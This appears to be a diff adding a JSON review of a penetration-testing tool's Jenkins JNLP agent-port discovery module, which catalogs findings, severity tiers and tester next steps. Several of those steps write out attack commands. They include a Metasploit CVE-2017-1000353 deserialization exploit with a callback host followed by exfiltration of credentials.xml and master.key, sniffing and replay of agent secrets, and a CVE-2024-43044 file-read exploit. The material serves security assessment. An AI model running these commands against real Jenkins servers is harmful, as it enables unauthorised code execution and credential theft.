@@ -1,0 +1,122 @@
+{
+  "service": "jenkins_jnlp",
+  "summary": "Solid Jenkins agent-listener discovery module: disambiguates 50000/tcp from IBM Db2/DRDA, negotiates the supported protocol set via an invalid-protocol trigger, and cross-links to the HTTP sibling /tcpSlaveAgentListener/ for X-Jenkins-Version + X-Instance-Identity fingerprint. Legacy-protocol / plaintext-JNLP / CLI-over-agent are proper T1s (deterministic negotiated-set membership). Two version-gated CVEs (CVE-2017-1000353, CVE-2024-43044) are T0 \u2014 version compare only, no exploit trigger. Biggest missing depth: no JNLP handshake completion \u2192 no CVE-2024-43044 fetchJar arbitrary-file-read PoC, no CLI2 deserialization PoC, no captured agent-secret validation. Instance-identity fingerprint is captured but not used to correlate captured agent secrets to controllers.",
+  "module_files": [
+    "recce/services/jenkins_jnlp.py"
+  ],
+  "proposed_shared_surface_consumers": [
+    "known_hostnames",
+    "known_credentials",
+    "known_instance_identities"
+  ],
+  "findings": [
+    {
+      "kind": "jnlp_reachable",
+      "title_pattern": "Jenkins JNLP agent listener reachable",
+      "severity": "medium",
+      "tier": "t0",
+      "tier_evidence": "Negotiation succeeded \u2014 enum baseline with protocol set as data.",
+      "can_promote_to": "stay",
+      "promotion_risk": "none",
+      "promotion_notes": "Baseline; depth in companion findings.",
+      "tester_next_step": "printf 'Protocol:PROTOCOL_INVALID\\n' | nc <ip> 50000 \u2014 confirm supported-protocols listing."
+    },
+    {
+      "kind": "jnlp_legacy_protocols",
+      "title_pattern": "Jenkins JNLP legacy protocols enabled",
+      "severity": "high",
+      "tier": "t1",
+      "tier_evidence": "Legacy names present in the returned protocol set \u2014 deterministic.",
+      "can_promote_to": "t2",
+      "promotion_risk": "medium",
+      "promotion_notes": "T2 = complete a JNLP1/2 handshake and prove the plaintext secret path, or attempt JNLP3 replay. Complex JNLP handshake implementation.",
+      "tester_next_step": "Use jenkins-jnlp-agent.jar or a scapy-scripted JNLP1 handshake with a captured secret; confirm the controller accepts."
+    },
+    {
+      "kind": "jnlp_plaintext_agent_channel",
+      "title_pattern": "Jenkins JNLP plaintext agent channel (secret on wire)",
+      "severity": "high",
+      "tier": "t1",
+      "tier_evidence": "JNLP1/JNLP2 in negotiated set \u2014 implies plaintext secret transport.",
+      "can_promote_to": "t3",
+      "promotion_risk": "high",
+      "promotion_notes": "T3 = on-path capture of the 64-hex agent secret on next agent reconnect; replay to complete handshake as that agent; then CVE-2024-43044 fetchJar for controller file read. Requires L2 on the agent LAN.",
+      "tester_next_step": "tcpdump -i any -A 'tcp port 50000' \u2014 wait for an agent reconnect; grep for 64-hex secret. Replay via jenkins-jnlp-agent.jar with that secret + captured node name."
+    },
+    {
+      "kind": "jnlp_cli2_deser_rce",
+      "title_pattern": "Jenkins CLI over agent port (CVE-2017-1000353 pre-auth Java deserialization RCE)",
+      "severity": "critical",
+      "tier": "t1",
+      "tier_evidence": "CLI2-connect / CLI-connect in the negotiated set \u2014 deterministic precondition for CVE-2017-1000353. No exploit payload sent.",
+      "can_promote_to": "t3",
+      "promotion_risk": "destructive",
+      "promotion_notes": "T3 = deliver a ysoserial CommonsCollections gadget via CLI upload; landing gives pre-auth RCE as the Jenkins controller. Destructive/detected; needs Metasploit or a hand-crafted gadget.",
+      "tester_next_step": "msfconsole -q -x 'use exploit/linux/misc/jenkins_command_receive; set RHOSTS <ip>; set RPORT 50000; set LHOST <lhost>; run' \u2014 then whoami/id, exfil credentials.xml + master.key.",
+      "related_cves": [
+        "CVE-2017-1000353"
+      ]
+    },
+    {
+      "kind": "jenkins_agent_listener_discovered",
+      "title_pattern": "Jenkins /tcpSlaveAgentListener/ metadata disclosed",
+      "severity": "high",
+      "tier": "t1",
+      "tier_evidence": "HTTP sibling GET returned X-Jenkins*/X-Instance-Identity headers \u2014 deterministic.",
+      "can_promote_to": "t2",
+      "promotion_risk": "low",
+      "promotion_notes": "T2 = walk /manage /script /login on the HTTP twin for further unauth surface; probe /queue/api/json for CI job disclosure.",
+      "tester_next_step": "curl -sk http://<ip>:8080/tcpSlaveAgentListener/ -I; then curl -sk http://<ip>:8080/asynchPeople/api/json (unauth user list on many installs)."
+    },
+    {
+      "kind": "jenkins_controller_identity",
+      "title_pattern": "Jenkins controller identity (X-Instance-Identity SPKI fingerprint) captured",
+      "severity": "medium",
+      "tier": "t0",
+      "tier_evidence": "SHA-256 of published public-key bytes \u2014 correlation data, no exploit.",
+      "can_promote_to": "stay",
+      "promotion_risk": "none",
+      "promotion_notes": "Belongs in a known_instance_identities shared surface for multi-scan correlation.",
+      "tester_next_step": "Store fingerprint alongside every captured agent secret; correlate reuse across IPs/subnets."
+    },
+    {
+      "kind": "jnlp_version_propagation",
+      "title_pattern": "Jenkins version propagated from HTTP twin onto agent port",
+      "severity": "info",
+      "tier": "t0",
+      "tier_evidence": "Version copied from X-Jenkins header \u2014 enum only.",
+      "can_promote_to": "stay",
+      "promotion_risk": "none",
+      "promotion_notes": "Feeds CVE gates.",
+      "tester_next_step": "Note version; check against SECURITY-* bulletins."
+    },
+    {
+      "kind": "jnlp_cve_2024_43044",
+      "title_pattern": "Jenkins agent\u2192controller file-read (CVE-2024-43044)",
+      "severity": "critical",
+      "tier": "t0",
+      "tier_evidence": "Version compare only \u2014 no fetchJar call attempted.",
+      "can_promote_to": "t3",
+      "promotion_risk": "high",
+      "promotion_notes": "T3 = complete JNLP4 handshake (needs valid agent secret or plaintext-JNLP capture), then invoke ClassLoaderProxy#fetchJar with /var/lib/jenkins/secrets/master.key /var/lib/jenkins/credentials.xml \u2014 full controller compromise. Public PoCs exist.",
+      "tester_next_step": "python3 jenkins_43044_exploit.py --host <ip> --port 50000 --agent <name> --secret <64hex> --file /var/lib/jenkins/secrets/master.key \u2014 extract, then decrypt credentials.xml offline.",
+      "related_cves": [
+        "CVE-2024-43044"
+      ]
+    },
+    {
+      "kind": "jnlp_cve_2017_1000353",
+      "title_pattern": "Jenkins < 2.46.2/2.57 (CVE-2017-1000353 pre-auth deserialization RCE)",
+      "severity": "critical",
+      "tier": "t0",
+      "tier_evidence": "Version compare only \u2014 fires when CLI2 not directly seen but version predates fix.",
+      "can_promote_to": "t3",
+      "promotion_risk": "destructive",
+      "promotion_notes": "Same T3 as jnlp_cli2_deser_rce; version-only variant triggers when negotiation didn't confess CLI2 but old build is likely to have it.",
+      "tester_next_step": "msfconsole exploit/linux/misc/jenkins_command_receive \u2014 same as CLI2 finding.",
+      "related_cves": [
+        "CVE-2017-1000353"
+      ]
+    }
+  ]
+}
